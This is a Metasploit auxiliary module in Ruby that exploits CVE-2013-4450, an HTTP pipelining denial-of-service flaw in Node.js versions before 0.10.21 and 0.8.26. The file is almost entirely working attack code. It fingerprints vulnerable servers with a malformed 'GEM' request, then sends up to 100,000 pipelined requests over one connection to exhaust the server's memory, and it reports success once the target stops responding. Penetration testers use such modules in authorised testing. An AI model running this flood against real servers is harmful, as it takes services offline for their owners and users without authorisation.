##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Node.js HTTP Pipelining DoS',
      'Description'    => %q{
        This module exploits a DoS in the HTTP parser of Node.js versions
        released before 0.10.21 and 0.8.26. The attack sends many pipelined
        HTTP requests on a single connection, which causes unbounded memory
        allocation when the client does not read the responses.
      },
      'Author'         => [ 'titanous', 'Marek Majkowski', 'joev' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://blog.nodejs.org/2013/10/22/cve-2013-4450-http-server-pipeline-flood-dos' ],
          [ 'CVE', '2013-4450' ],
          [ 'OSVDB', '98724' ],
          [ 'BID' , '63229' ],
        ],
      'DisclosureDate' => 'Oct 18 2013'))

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('RLIMIT', [true,  "Number of requests to send", 100000])
      ],
    self.class)
  end

  def check
    # http://blog.nodejs.org/2013/08/21/node-v0-10-17-stable/
    # check if we are < 0.10.17 by seeing if a malformed HTTP request is accepted
    status = Exploit::CheckCode::Unknown
    connect
    sock.put(http_request("GEM"))
    begin
      response = sock.get_once
      status = Exploit::CheckCode::Appears if response =~ /HTTP/
    rescue EOFError
      # checking against >= 0.10.17 raises EOFError because there is no
      # response to GEM requests
    ensure
      disconnect
    end
    status
  end

  def host
      host = datastore['RHOST']
      host += ":" + datastore['RPORT'].to_s if datastore['RPORT'] != 80
      host
  end

  def http_request(method='GET')
    "#{method} / HTTP/1.1\r\nHost: #{host}\r\n\r\n"
  end

  def run
    payload = http_request
    begin
      connect
      datastore['RLIMIT'].times { sock.put(payload) }
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_status("Unable to connect to #{host}.")
    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
      print_status("DoS successful. #{host} not responding.")
    ensure
      disconnect
    end
  end
end
